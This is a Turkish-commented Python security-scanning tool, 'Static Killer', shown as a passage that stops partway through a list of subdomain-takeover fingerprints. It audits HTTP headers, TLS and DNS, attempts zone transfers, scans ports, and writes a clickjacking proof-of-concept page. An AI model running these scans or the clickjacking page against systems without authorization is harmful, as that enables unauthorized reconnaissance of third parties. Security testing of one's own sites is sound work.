#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║       Static Killer by eren  v2.0             ║
║  HTTP/HTTPS Analiz | DNS | Port Tarama  ║
╚══════════════════════════════════════════╝
Kullanim: python3 static_killer.py
"""

import os
import socket
import ssl
import sys
import time
import subprocess
import threading
import datetime
import urllib.request
import urllib.error
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    G   = Fore.GREEN
    R   = Fore.RED
    Y   = Fore.YELLOW
    C   = Fore.CYAN
    M   = Fore.MAGENTA
    W   = Fore.WHITE
    DIM = Style.DIM
    B   = Style.BRIGHT
    RST = Style.RESET_ALL
except ImportError:
    G = R = Y = C = M = W = DIM = B = RST = ""

def print_banner():
    rows = [
        (" ███████╗████████╗ █████╗ ████████╗██╗ ██████╗ ", G),
        (" ██╔════╝╚══██╔══╝██╔══██╗╚══██╔══╝██║██╔════╝ ", G),
        (" ███████╗   ██║   ███████║   ██║   ██║██║      ", G),
        (" ╚════██║   ██║   ██╔══██║   ██║   ██║██║      ", G),
        (" ███████║   ██║   ██║  ██║   ██║   ██║╚██████╗ ", G),
        (" ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ", G),
        ("                                               ", G),
        (" ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗    ", G),
        (" ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗   ", G),
        (" █████╔╝ ██║██║     ██║     █████╗  ██████╔╝   ", G),
        (" ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗   ", G),
        (" ██║  ██╗██║███████╗███████╗███████╗██║  ██║   ", G),
        (" ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝   ", G),
    ]
    print()
    for text, color in rows:
        print(f"  {color}{B}{text}{RST}")
        time.sleep(0.06)
    line = chr(9472)*46
    print(f"\n  {DIM}{line}{RST}")
    print(f"  {C}  STATIC KILLER  {W}v1.0{RST}  {DIM}| created by eren aloglu{RST}")
    print(f"  {DIM}{line}{RST}")
    mods = [f"{G}1{RST} HTTP/HTTPS", f"{C}2{RST} DNS", f"{Y}3{RST} Port",
            f"{M}4{RST} Subdomain", f"{R}5{RST} JS&Secret", f"{W}6{RST} Tam Tarama"]
    print(f"  {'   '.join(mods)}")
    print(f"  {DIM}{line}{RST}\n")

SEP  = f"{DIM}{'─' * 58}{RST}"
SEP2 = f"{DIM}{'━' * 58}{RST}"

def ok(msg):   print(f"  {G}✔{RST}  {msg}")
def warn(msg): print(f"  {Y}⚠{RST}  {msg}")
def err(msg):  print(f"  {R}✘{RST}  {msg}")
def info(msg): print(f"  {C}»{RST}  {msg}")
def sub(msg):  print(f"  {DIM}║{RST}  {msg}")

def badge_ok(s):   return f"{G}[{s}]{RST}"
def badge_warn(s): return f"{Y}[{s}]{RST}"
def badge_err(s):  return f"{R}[{s}]{RST}"

def section(title, color=C):
    print(f"\n{color}{B}  ┌{'─'*50}┐")
    pad = 50 - len(title) - 2
    print(f"  │  {title}{' '*max(pad,0)}│")
    print(f"  └{'─'*50}┘{RST}")

def spinner_run(fn, msg):
    result = [None]; exc = [None]; done = threading.Event()
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    def worker():
        try:    result[0] = fn()
        except Exception as e: exc[0] = e
        finally: done.set()
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    i = 0
    while not done.is_set():
        sys.stdout.write(f"\r  {C}{frames[i%len(frames)]}{RST}  {msg}  ")
        sys.stdout.flush()
        time.sleep(0.1); i += 1
    sys.stdout.write("\r"+" "*60+"\r"); sys.stdout.flush()
    if exc[0]: raise exc[0]
    return result[0]

def normalize_url(url):
    url = url.strip()
    if not url.startswith(("http://","https://")): url = "https://"+url
    return url

def extract_host(url):
    return normalize_url(url).split("//",1)[1].split("/")[0].split(":")[0]

def ask_proof(vuln_name):
    try:
        ans = input(f"\n  {Y}?{RST}  {Y}{vuln_name}{RST} zafiyetini kanıtlamak ister misiniz? {DIM}[e/H]{RST}: ").strip().lower()
        return ans in ("e","evet","y","yes")
    except (EOFError, KeyboardInterrupt):
        return False

def run_curl(args, label):
    """curl komutunu çalıştır, çıktıyı renkli terminale bas."""
    cmd = ["curl", "-sI", "--max-time", "8", "-A", "static killer/1.0"] + args
    print(f"\n  {DIM}$ {' '.join(cmd)}{RST}\n")
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
        lines = (out.stdout or out.stderr or "").strip().splitlines()
        for line in lines:
            if ":" in line:
                key, _, val = line.partition(":")
                # İlgili header'ı vurgula
                if label.lower() in key.lower():
                    print(f"  {G}{key}:{val}{RST}")
                elif any(w in key.lower() for w in ["http","status","location","server"]):
                    print(f"  {C}{line}{RST}")
                else:
                    print(f"  {DIM}{line}{RST}")
            else:
                print(f"  {C}{line}{RST}")
        return out.stdout
    except FileNotFoundError:
        err("curl bulunamadı — lütfen yükleyin: sudo apt install curl")
        return ""
    except subprocess.TimeoutExpired:
        err("curl zaman aşımına uğradı.")
        return ""

def save_poc_html(filename, content, vuln_name):
    path = os.path.join(os.getcwd(), filename)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"\n  {G}✔{RST}  PoC kaydedildi  →  {C}{path}{RST}")
    print(f"     {DIM}Tarayıcıda açın — '{vuln_name}' zafiyetini canlı görün.{RST}")

# ─── POC / KANIT FONKSİYONLARI ───────────────────────────

def proof_clickjacking(url):
    """X-Frame-Options → iframe içine gömme PoC HTML'i üret (gerçekten iframe gerekiyor)."""
    host = extract_host(url)
    print(f"\n  {C}»{RST}  X-Frame-Options eksikliği, sitenin iframe içine gömülebildiğini kanıtlamak")
    print(f"     için bir HTML dosyası oluşturulacak. Tarayıcıda açarak görebilirsiniz.\n")
    html = f"""<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8">
<title>PoC: Clickjacking — X-Frame-Options Eksik</title>
<style>
body{{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:20px}}
h2{{color:#f85149}}
.info{{background:#161b22;border:1px solid #30363d;padding:12px 16px;border-radius:6px;margin-bottom:16px}}
.info span{{color:#58a6ff}}
.container{{position:relative;width:860px;height:540px;border:2px solid #f85149;border-radius:6px;overflow:hidden;margin-top:12px}}
iframe{{width:100%;height:100%;border:none;opacity:0.35;position:absolute;top:0;left:0;z-index:2;pointer-events:none}}
.fake-btn{{position:absolute;top:250px;left:370px;background:#238636;color:#fff;border:none;padding:10px 26px;font-size:15px;border-radius:6px;cursor:pointer;z-index:3}}
.label{{position:absolute;top:8px;left:8px;background:rgba(248,81,73,.15);border:1px dashed #f85149;color:#f85149;padding:4px 10px;border-radius:4px;font-size:12px;z-index:4}}
pre{{background:#161b22;border:1px solid #30363d;padding:14px;border-radius:6px;color:#e3b341;margin-top:16px}}
</style></head><body>
<h2>⚠ PoC: Clickjacking — {host}</h2>
<div class="info">
  <b>Zafiyet:</b> X-Frame-Options header eksik<br>
  <b>Hedef:</b> <span>{url}</span><br>
  <b>Saldırı:</b> Site şeffaf iframe içine gömülmüş. Kullanıcı "Ücretsiz Kazan!" butonuna
  tıklarken aslında arkadaki gerçek sitede bir işlem tetikleniyor.<br>
  <b>Çözüm:</b> <code>X-Frame-Options: DENY</code> &nbsp;veya&nbsp;
  <code>Content-Security-Policy: frame-ancestors 'none'</code>
</div>
<p style="color:#e3b341">↓ Gerçek site iframe içinde (orijinal saldırıda opacity: 0.01 — tamamen görünmez)</p>
<div class="container">
  <span class="label">← hedef site (gizli katman)</span>
  <iframe src="{url}"></iframe>
  <button class="fake-btn"
    onclick="alert('Kullanıcı tıkladı!\\n\\nAslında arka plandaki {host} sitesindeki\\nbir butona bastı — oturum işlemi, form gönderimi,\\nbeğeni veya silme tetiklenebilirdi.')">
    🎁 Ücretsiz Kazan!
  </button>
</div>
<pre>Düzeltme:
  # Nginx
  add_header X-Frame-Options "DENY" always;
  add_header Content-Security-Policy "frame-ancestors 'none';" always;
  # Apache
  Header always set X-Frame-Options "DENY"</pre>
<p style="color:#8b949e;font-size:12px;margin-top:12px"> static killer v1.0 — Yalnızca eğitim amaçlıdır.</p>
</body></html>"""
    save_poc_html("poc_clickjacking.html", html, "Clickjacking")

def proof_curl_header(url, header_name, vuln_label):
    """curl -sI ile belirli header'ın yokluğunu terminalde kanıtla."""
    print(f"\n  {C}»{RST}  curl ile {header_name} header varlığı kontrol ediliyor...")
    raw = run_curl([url], header_name)
    if raw:
        found = any(header_name.lower() in line.lower() for line in raw.splitlines())
        if found:
            ok(f"{header_name} header yanıtta mevcut.")
        else:
            err(f"{header_name} header yanıtta YOK — {vuln_label} zafiyeti doğrulandı!")
            print(f"\n  {Y}  Kanıt:{RST} Yukarıdaki curl çıktısında '{header_name}' satırı görünmüyor.")

def proof_hsts(url):
    """HSTS: HTTP üzerinden istek at, HSTS header ve yönlendirmeyi göster."""
    host  = extract_host(url)
    http_url = f"http://{host}"
    print(f"\n  {C}»{RST}  HSTS testi: HTTP üzerinden istek atılıyor ({http_url})...")
    print(f"     {DIM}HSTS varsa 301/307 + Strict-Transport-Security header görünmeli.{RST}")
    raw = run_curl(["-L", "--max-redirs", "1", http_url], "strict-transport")
    if raw:
        has_hsts = any("strict-transport-security" in l.lower() for l in raw.splitlines())
        has_redir = any(l.startswith("HTTP/") and ("301" in l or "307" in l) for l in raw.splitlines())
        if has_hsts:
            ok("Strict-Transport-Security header mevcut — HSTS aktif.")
        else:
            err("Strict-Transport-Security header YOK — SSL Stripping saldırısına açık!")
        if not has_redir:
            warn("HTTP'den HTTPS'e yönlendirme de yapılmıyor — tüm trafik düz metin akabilir.")

def proof_xss_info():
    """X-XSS-Protection: curl ile doğrulanamaz, bilgi mesajı göster."""
    print(f"\n  {DIM}  X-XSS-Protection tarayıcı tarafında yorumlanan bir header'dır.{RST}")
    print(f"  {DIM}  curl testi anlamsız — ancak CSP kurularak bu risk tamamen ortadan kalkar.{RST}")
    print(f"  {Y}  Parametre eksik:{RST} X-XSS-Protection: 1; mode=block  header sunucuya eklenmeli.")

def proof_permissions_info():
    """Permissions-Policy: curl kanıtı mümkün değil, açıklama yaz."""
    print(f"\n  {DIM}  Permissions-Policy, tarayıcının kamera/mikrofon/konum API erişimini{RST}")
    print(f"  {DIM}  kısıtlar. Etkisi yalnızca tarayıcı ortamında test edilebilir.{RST}")
    print(f"  {Y}  Parametre eksik:{RST} Permissions-Policy: camera=(), microphone=(), geolocation=()")
    print(f"  {DIM}  Bu header olmadan iframe veya XSS ile hassas API'lere erişilebilir.{RST}")

# ─── HEADER META & KANIT YÖNTEMLERİ ─────────────────────
# proof_type:
#   "html"      → clickjacking gibi iframe PoC HTML üret
#   "curl"      → curl -sI ile header varlığını terminalde kanıtla
#   "curl_hsts" → HTTP üzerinden curl, HSTS + yönlendirme kontrolü
#   "info"      → terminal kanıtı mümkün değil, açıklama yaz

HEADER_META = {
    "X-Frame-Options": {
        "attack":     "Clickjacking",
        "risk":       "YÜKSEK",
        "desc":       "Saldırgan sitenizi gizli iframe içine gömer; kullanıcı farkında olmadan işlem yapar",
        "fix":        "X-Frame-Options: DENY",
        "proof_type": "html",
    },
    "Content-Security-Policy": {
        "attack":     "Script Injection / XSS",
        "risk":       "KRİTİK",
        "desc":       "Harici script yükleme, inline JS, veri sızdırma mümkün",
        "fix":        "Content-Security-Policy: default-src 'self'; frame-ancestors 'none';",
        "proof_type": "curl",
        "curl_grep":  "content-security-policy",
    },
    "X-XSS-Protection": {
        "attack":     "Cross-Site Scripting (XSS)",
        "risk":       "YÜKSEK",
        "desc":       "Tarayıcı tabanlı XSS filtresi kapalı; reflected XSS kolaylaşır",
        "fix":        "X-XSS-Protection: 1; mode=block",
        "proof_type": "info",
    },
    "Strict-Transport-Security": {
        "attack":     "SSL Stripping / MitM",
        "risk":       "YÜKSEK",
        "desc":       "Saldırgan HTTPS'i HTTP'ye düşürüp şifreli trafiği okuyabilir",
        "fix":        "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        "proof_type": "curl_hsts",
    },
    "X-Content-Type-Options": {
        "attack":     "MIME Sniffing",
        "risk":       "ORTA",
        "desc":       "Tarayıcı yanlış MIME tipli dosyayı script olarak yorumlayabilir",
        "fix":        "X-Content-Type-Options: nosniff",
        "proof_type": "curl",
        "curl_grep":  "x-content-type-options",
    },
    "Referrer-Policy": {
        "attack":     "Bilgi Sızıntısı",
        "risk":       "ORTA",
        "desc":       "URL'deki token/ID dış sitelere Referer header ile sızabilir",
        "fix":        "Referrer-Policy: strict-origin-when-cross-origin",
        "proof_type": "curl",
        "curl_grep":  "referrer-policy",
    },
    "Permissions-Policy": {
        "attack":     "API İzin İstismarı",
        "risk":       "ORTA",
        "desc":       "Kötü amaçlı script kamera, mikrofon, konum API'lerine erişebilir",
        "fix":        "Permissions-Policy: camera=(), microphone=(), geolocation=()",
        "proof_type": "info",
    },
}

def run_proof(header_name, url, meta):
    """Zafiyet türüne göre uygun kanıtlama yöntemini çalıştır."""
    ptype = meta["proof_type"]

    if ptype == "html":
        proof_clickjacking(url)

    elif ptype == "curl":
        grep_key = meta.get("curl_grep", header_name.lower())
        proof_curl_header(url, header_name, grep_key)

    elif ptype == "curl_hsts":
        proof_hsts(url)

    elif ptype == "info":
        if header_name == "X-XSS-Protection":
            proof_xss_info()
        elif header_name == "Permissions-Policy":
            proof_permissions_info()

# ─── TLS ──────────────────────────────────────────────────

def get_tls_info(host, port=443):
    ctx = ssl.create_default_context()
    try:
        with ctx.wrap_socket(socket.create_connection((host, port), timeout=5), server_hostname=host) as s:
            cert = s.getpeercert(); cipher = s.cipher(); version = s.version()
            exp_str = cert.get("notAfter","")
            days_left = -1
            if exp_str:
                exp = datetime.datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
                days_left = (exp - datetime.datetime.utcnow()).days
            subject = dict(x[0] for x in cert.get("subject",[]))
            issuer  = dict(x[0] for x in cert.get("issuer", []))
            return {"version":version, "cipher":cipher[0] if cipher else "?",
                    "bits":cipher[2] if cipher else "?",
                    "cn":subject.get("commonName","?"), "issuer":issuer.get("organizationName","?"),
                    "days_left":days_left, "san":[v for t,v in cert.get("subjectAltName",[]) if t=="DNS"]}
    except Exception as e:
        return {"error": str(e)}

# ─── HTTP ANALİZ ──────────────────────────────────────────

def http_analyze(target):
    url  = normalize_url(target)
    host = extract_host(url)

    print(f"\n{SEP2}")
    print(f"  {B}{W}  HTTP / HTTPS ANALİZ  {RST}")
    print(f"  {C}Hedef: {W}{url}{RST}")
    print(SEP2)

    # ── 1. PROTOKOL ──────────────────────────────────────
    section("1.  PROTOKOL & BAĞLANTI", G)
    https = url.startswith("https")
    if https: ok(f"Protokol  :  {badge_ok('HTTPS')}  Şifreli bağlantı")
    else:     err(f"Protokol  :  {badge_err('HTTP')}  Şifresiz bağlantı!")

    if not HAS_REQUESTS:
        warn("requests kütüphanesi yok — pip install requests"); return
    try:
        def _req():
            sess = requests.Session()
            return sess.get(url, timeout=10, allow_redirects=True,
                            headers={"User-Agent":"Mozilla/5.0 (static-killer/1.0)"})
        resp    = spinner_run(_req, "HTTP isteği gönderiliyor...")
        status  = resp.status_code
        hdrs    = resp.headers
        history = resp.history
    except Exception as e:
        err(f"Bağlantı kurulamadı: {e}"); return

    color = G if status < 300 else Y if status < 400 else R
    ok(f"HTTP Status  :  {color}{status}{RST}  {resp.reason}")
    if history:
        chain = " → ".join(str(r.status_code) for r in history) + f" → {status}"
        sub(f"Yönlendirme  :  {DIM}{chain}{RST}")
    server  = hdrs.get("Server") or hdrs.get("server") or "gizli"
    powered = hdrs.get("X-Powered-By") or hdrs.get("x-powered-by")
    if server != "gizli": warn(f"Server header açık: {Y}{server}{RST}  ← sürüm bilgisi sızıntısı!")
    else:                  ok(f"Server header  :  gizli  {badge_ok('İYİ')}")
    if powered: err(f"X-Powered-By   :  {powered}  ← teknoloji sızıntısı!")

    # ── 2. TLS ───────────────────────────────────────────
    section("2.  TLS / SSL ANALİZİ", C)
    if https:
        tls = spinner_run(lambda: get_tls_info(host), "TLS el sıkışması...")
        if "error" in tls:
            err(f"TLS hatası: {tls['error']}")
        else:
            ver = tls["version"]
            vc  = G if "1.3" in ver else Y if "1.2" in ver else R
            ok(f"TLS Versiyonu  :  {vc}{ver}{RST}")
            ok(f"Cipher Suite   :  {C}{tls['cipher']}{RST}  ({tls['bits']} bit)")
            ok(f"CN             :  {tls['cn']}")
            ok(f"Issuer         :  {tls['issuer']}")
            d = tls["days_left"]
            if d > 30:  ok(f"Sertifika      :  {G}{d} gün geçerli{RST}")
            elif d > 0: warn(f"Sertifika      :  {Y}{d} gün — yakında dolacak!{RST}")
            else:       err(f"Sertifika      :  {R}SÜRESİ DOLMUŞ{RST}")
            if tls["san"]: ok(f"SAN            :  {DIM}{', '.join(tls['san'][:6])}{RST}")
            if "1.3" not in ver and "1.2" not in ver:
                err("Eski TLS versiyonu! POODLE/BEAST saldırılarına karşı savunmasız.")
    else:
        err("HTTPS kullanılmıyor — TLS analizi atlandı.")

    # ── 3–9. HER GÜVENLİK HEADER'I AYRI BÖLÜM ──────────
    missing_vulns = []
    for idx, (hname, meta) in enumerate(HEADER_META.items(), start=3):
        section(f"{idx}.  {hname.upper()}", C)
        val = hdrs.get(hname) or hdrs.get(hname.lower())
        if val:
            ok(f"Header mevcut   :  {badge_ok('GÜVENLİ')}")
            sub(f"Değer           :  {G}{val}{RST}")
        else:
            err(f"Header eksik    :  {badge_err(meta['risk'])}")
            sub(f"Saldırı tipi    :  {R}{meta['attack']}{RST}")
            sub(f"Risk            :  {meta['desc']}")
            sub(f"Önerilen düzeltme : {Y}{meta['fix']}{RST}")
            missing_vulns.append(hname)

    # ── COOKIE ───────────────────────────────────────────
    section(f"{3+len(HEADER_META)}.  COOKIE GÜVENLİĞİ", C)
    cookies = resp.cookies
    if cookies:
        for c in cookies:
            flags = []
            if c.secure:                                  flags.append(badge_ok("Secure"))
            else:                                         flags.append(badge_err("!Secure"))
            if c.has_nonstandard_attr("HttpOnly"):        flags.append(badge_ok("HttpOnly"))
            else:                                         flags.append(badge_err("!HttpOnly"))
            ss = c.get_nonstandard_attr("SameSite") or "Yok"
            flags.append(f"SameSite:{badge_ok(ss) if ss in ('Strict','Lax') else badge_warn(ss)}")
            print(f"  {C}●{RST}  {W}{c.name}{RST}   {'  '.join(flags)}")
    else:
        sub(f"{DIM}Cookie tespit edilmedi{RST}")

    # ── ÖZET SKOR ────────────────────────────────────────
    total_h = len(HEADER_META)
    ok_h    = total_h - len(missing_vulns)
    pct     = int(ok_h / total_h * 100)
    color   = G if pct >= 70 else Y if pct >= 40 else R
    bar     = color+"█"*(pct//5)+RST+DIM+"░"*(20-pct//5)+RST
    section("★  GÜVENLİK ÖZET SKORU", M)
    print(f"  {color}{B}  {pct}%  {RST}  [{bar}]  ({ok_h}/{total_h} header güvenli)")
    if missing_vulns:
        print(f"\n  {R}{B}  Tespit edilen zafiyetler:{RST}")
        for v in missing_vulns:
            m = HEADER_META[v]
            print(f"    {R}⚠{RST}  {W}{v}{RST}  →  {Y}{m['attack']}{RST}  {badge_err(m['risk'])}")

    # ── KANIT / POC ──────────────────────────────────────
    if missing_vulns:
        print(f"\n{SEP}")
        print(f"  {M}{B}  ZAFİYET KANITLAMA{RST}")
        print(f"  {DIM}Tespit edilen her zafiyet için uygun kanıt yöntemi çalıştırılabilir.{RST}")
        print(SEP)
        for v in missing_vulns:
            meta = HEADER_META[v]
            ptype = meta["proof_type"]
            if ptype == "info":
                # Direkt bilgi yaz, sormaya gerek yok
                run_proof(v, url, meta)
            else:
                label = "PoC HTML oluştur" if ptype == "html" else "curl ile kanıtla"
                if ask_proof(f"{v}  [{label}]"):
                    run_proof(v, url, meta)

    print(f"\n{SEP2}\n")

# ─── DNS ANALİZ ───────────────────────────────────────────

def dns_query_raw(domain, record_type):
    try:
        if record_type == "A":
            r = socket.getaddrinfo(domain, None, socket.AF_INET)
            return list(set(x[4][0] for x in r))
        elif record_type == "AAAA":
            r = socket.getaddrinfo(domain, None, socket.AF_INET6)
            return list(set(x[4][0] for x in r))
        elif record_type in ("MX","NS","TXT","CNAME","SOA"):
            out = subprocess.run(["dig","+short",record_type,domain], capture_output=True, text=True, timeout=5)
            return [l.strip() for l in out.stdout.strip().splitlines() if l.strip()]
    except Exception: return []
    return []

def check_dig_available():
    try: subprocess.run(["dig","-v"], capture_output=True, timeout=2); return True
    except Exception: return False

def dns_analyze(domain):
    domain = domain.strip().replace("https://","").replace("http://","").split("/")[0]
    print(f"\n{SEP2}")
    print(f"  {B}{W}  DNS SORGULAMA  {RST}")
    print(f"  {C}Hedef: {W}{domain}{RST}")
    print(SEP2)
    has_dig = check_dig_available()
    if not has_dig: warn("'dig' bulunamadı — sadece A/AAAA socket ile sorgulanacak.")

    section("1.  A KAYITLARI  (IPv4)", G)
    a_records = spinner_run(lambda: dns_query_raw(domain,"A"), "A kayıtları sorgulanıyor...")
    if a_records:
        for ip in a_records:
            ok(ip)
            try: sub(f"rDNS: {socket.gethostbyaddr(ip)[0]}")
            except: pass
    else: warn("A kaydı bulunamadı")

    section("2.  AAAA KAYITLARI  (IPv6)", C)
    aaaa = spinner_run(lambda: dns_query_raw(domain,"AAAA"), "AAAA sorgulanıyor...")
    if aaaa:
        for ip in aaaa: ok(ip)
    else: sub(f"{DIM}IPv6 desteği yok{RST}")

    if has_dig:
        section("3.  MX KAYITLARI  (Mail)", C)
        mx = spinner_run(lambda: dns_query_raw(domain,"MX"), "MX sorgulanıyor...")
        for r in mx: ok(r)
        if not mx: sub(f"{DIM}MX kaydı yok{RST}")

        section("4.  NS KAYITLARI  (Nameserver)", C)
        ns = spinner_run(lambda: dns_query_raw(domain,"NS"), "NS sorgulanıyor...")
        for r in ns: ok(r)

        section("5.  TXT KAYITLARI", C)
        txt = spinner_run(lambda: dns_query_raw(domain,"TXT"), "TXT sorgulanıyor...")
        spf_found = dmarc_found = False
        for r in txt:
            sub(f"{Y}\"{r}\"{RST}")
            if "v=spf1" in r.lower():   spf_found  = True
            if "v=dmarc1" in r.lower(): dmarc_found = True

        cname = spinner_run(lambda: dns_query_raw(domain,"CNAME"), "")
        if cname:
            section("6.  CNAME", C)
            for r in cname: ok(r)

        section("7.  E-POSTA GÜVENLİĞİ  (SPF / DMARC / DKIM)", M)
        if spf_found:   ok(f"SPF    {badge_ok('VAR')}")
        else:           err(f"SPF    {badge_err('EKSİK')}  — sahte mail gönderilebilir!")
        if dmarc_found: ok(f"DMARC  {badge_ok('VAR')}")
        else:           err(f"DMARC  {badge_err('EKSİK')}  — domain spoofing riski!")

        section("8.  DKIM KONTROLÜ", C)
        found_dkim = False
        for sel in ["default","google","k1","mail","selector1","selector2","dkim"]:
            try:
                out = subprocess.run(["dig","+short","TXT",f"{sel}._domainkey.{domain}"], capture_output=True, text=True, timeout=3)
                if "v=DKIM1" in out.stdout or "p=" in out.stdout:
                    ok(f"DKIM bulundu — selector: {G}{sel}{RST}"); found_dkim = True; break
            except: pass
        if not found_dkim: warn("DKIM tespit edilemedi (yaygın selector'lar denendi)")

        section("9.  ZONE TRANSFER TESTİ", R)
        for nameserver in ns[:2]:
            ns_c = nameserver.rstrip(".")
            try:
                out = subprocess.run(["dig","axfr",domain,f"@{ns_c}"], capture_output=True, text=True, timeout=5)
                if "Transfer failed" in out.stdout or out.returncode != 0: ok(f"Zone transfer engelli ({ns_c})")
                elif len(out.stdout.strip().splitlines()) > 5:             err(f"ZONE TRANSFER AÇIK! ({ns_c}) — kritik!")
                else:                                                       ok(f"Zone transfer engelli ({ns_c})")
            except: sub(f"{DIM}Test edilemedi: {ns_c}{RST}")
    else:
        warn("Gelişmiş DNS testleri için 'dig' (dnsutils) kurun.")
    print(f"\n{SEP2}\n")

# ─── PORT TARAMA ──────────────────────────────────────────

COMMON_PORTS = {
    21:("FTP","Dosya transferi — güvensiz"),22:("SSH","Uzak erişim"),23:("Telnet","Şifresiz — tehlikeli!"),
    25:("SMTP","Mail"),53:("DNS","DNS"),80:("HTTP","Web — şifresiz"),110:("POP3","Mail"),
    143:("IMAP","Mail"),443:("HTTPS","Güvenli web"),445:("SMB","Windows paylaşım — saldırı hedefi"),
    1433:("MSSQL","SQL Server"),1521:("Oracle","Oracle DB"),3000:("Node Dev","Geliştirici"),
    3306:("MySQL","MySQL"),3389:("RDP","Uzak masaüstü — saldırı hedefi"),
    4200:("Angular","Geliştirici"),5000:("Flask","Geliştirici"),5432:("PostgreSQL","PostgreSQL"),
    5900:("VNC","Uzak masaüstü — güvensiz"),6379:("Redis","Redis — auth kontrol!"),
    8000:("HTTP Alt","Alternatif"),8080:("HTTP Proxy","Proxy"),8443:("HTTPS Alt","Alt HTTPS"),
    8888:("Jupyter","Jupyter"),9200:("Elasticsearch","ES — açık bırakma!"),27017:("MongoDB","Mongo — auth!"),
}
RISKY_PORTS = {23,21,445,3389,5900,6379,9200,27017}

def scan_port(host, port, timeout=1.0):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            try: s.settimeout(0.5); banner = s.recv(256).decode(errors="ignore").strip()
            except: banner = ""
            return ("open", banner)
    except (ConnectionRefusedError, OSError): return ("closed","")
    except socket.timeout: return ("filtered","")

def grab_http_banner(host, port):
    try:
        if port in (443,8443):
            ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            conn=http.client.HTTPSConnection(host,port,timeout=3,context=ctx)
        else: conn=http.client.HTTPConnection(host,port,timeout=3)
        conn.request("HEAD","/",headers={"Host":host,"User-Agent":"static-killer/1.0"})
        r=conn.getresponse()
        return f"{r.status} {r.reason}  Server:{r.getheader('Server','?')}"
    except: return ""

def port_scan(target, ports=None, threads=50, timeout=0.8):
    host = target.strip().replace("https://","").replace("http://","").split("/")[0]
    print(f"\n{SEP2}")
    print(f"  {B}{W}  PORT TARAMA  {RST}")
    print(f"  {C}Hedef: {W}{host}{RST}")
    print(SEP2)
    try:
        ip = socket.gethostbyname(host); ok(f"IP adresi : {G}{ip}{RST}")
    except Exception as e:
        err(f"Host çözümlenemedi: {e}"); return

    if ports is None: ports = list(COMMON_PORTS.keys())
    total = len(ports); info(f"{total} port taranıyor  ({threads} thread  timeout={timeout}s)\n")
    results = {}; lock = threading.Lock(); done = [0]

    def scan_one(p):
        state, banner = scan_port(ip, p, timeout)
        if state=="open" and p in (80,443,8080,8443,8000,3000,5000):
            hb = grab_http_banner(host, p)
            if hb: banner = hb
        with lock:
            done[0]+=1; pct=int(done[0]/total*20)
            bar=G+"█"*pct+DIM+"░"*(20-pct)+RST
            sys.stdout.write(f"\r  {C}»{RST}  [{bar}] {done[0]}/{total}  "); sys.stdout.flush()
        return p, state, banner

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures={ex.submit(scan_one,p):p for p in ports}
        for f in as_completed(futures):
            p,state,banner=f.result(); results[p]=(state,banner)
    print("\n")

    open_ports     = [(p,r) for p,r in sorted(results.items()) if r[0]=="open"]
    filtered_ports = [(p,r) for p,r in sorted(results.items()) if r[0]=="filtered"]

    section("AÇIK PORTLAR", G)
    if open_ports:
        print(f"  {DIM}  {'PORT':<7} {'SERVİS':<16} {'RİSK':<10} BANNER{RST}")
        print(f"  {DIM}{'─'*56}{RST}")
        for p,(state,banner) in open_ports:
            svc,desc = COMMON_PORTS.get(p,("bilinmiyor",""))
            risk  = badge_err("YÜKSEK") if p in RISKY_PORTS else badge_warn("ORTA") if p in {80,8080,8000} else badge_ok("DÜŞÜK")
            bshrt = banner[:35] if banner else DIM+desc[:35]+RST
            print(f"  {G}●{RST}  {Y}{str(p):<7}{RST} {C}{svc:<16}{RST} {risk:<22} {DIM}{bshrt}{RST}")
    else: sub(f"{DIM}Açık port bulunamadı{RST}")

    if filtered_ports:
        section("FİLTRELENMİŞ", Y)
        sub(f"{DIM}{', '.join(str(p) for p,_ in filtered_ports)}{RST}")

    risky_open = [p for p,(s,_) in results.items() if s=="open" and p in RISKY_PORTS]
    if risky_open:
        section("GÜVENLİK UYARILARI", R)
        for p in risky_open:
            svc,desc = COMMON_PORTS.get(p,("?",""))
            err(f"Port {Y}{p}{RST} ({svc}) açık!  {desc}")

    section("ÖZET", M)
    ok(f"Açık         : {G}{len(open_ports)}{RST}")
    warn(f"Filtrelenmiş  : {Y}{len(filtered_ports)}{RST}")
    info(f"Kapalı       : {DIM}{total-len(open_ports)-len(filtered_ports)}{RST}")
    print(f"\n{SEP2}\n")

import re as _re
import threading as _threading
import subprocess as _subprocess
import socket as _socket
import sys as _sys

# ─── SUBDOMAIN TAKEOVER ──────────────────────────────────

TAKEOVER_FINGERPRINTS = [
    ("github.io",        "There isn't a GitHub Pages site here", "GitHub Pages"),
    ("github.io",        "404 - File or directory not found",     "GitHub Pages"),
    ("herokudns.com",    "No such app",                           "Heroku"),
    ("herokuapp.com",    "No such app",                           "Heroku"),
    ("amazonaws.com",    "NoSuchBucket",                          "AWS S3"),
    ("s3.amazonaws.com", "The specified bucket does not exist",   "AWS S3"),
    ("azurewebsites.net","404 Web Site not found",                "Azure"),
    ("cloudfront.net",   "Bad Request",                           "CloudFront"),
    ("fastly.net",       "Fastly error: unknown domain",          "Fastly"),
    ("pantheonsite.io",  "The gods are wise",                     "Pantheon"),
    ("ghost.io",         "404 - Page not found",                  "Ghost"),
    ("surge.sh",         "project not found",                     "Surge"),
    ("bitbucket.io",     "Repository not found",                  "Bitbucket"),
    ("zendesk.com",      "Help Center Closed",                    "Zendesk"),
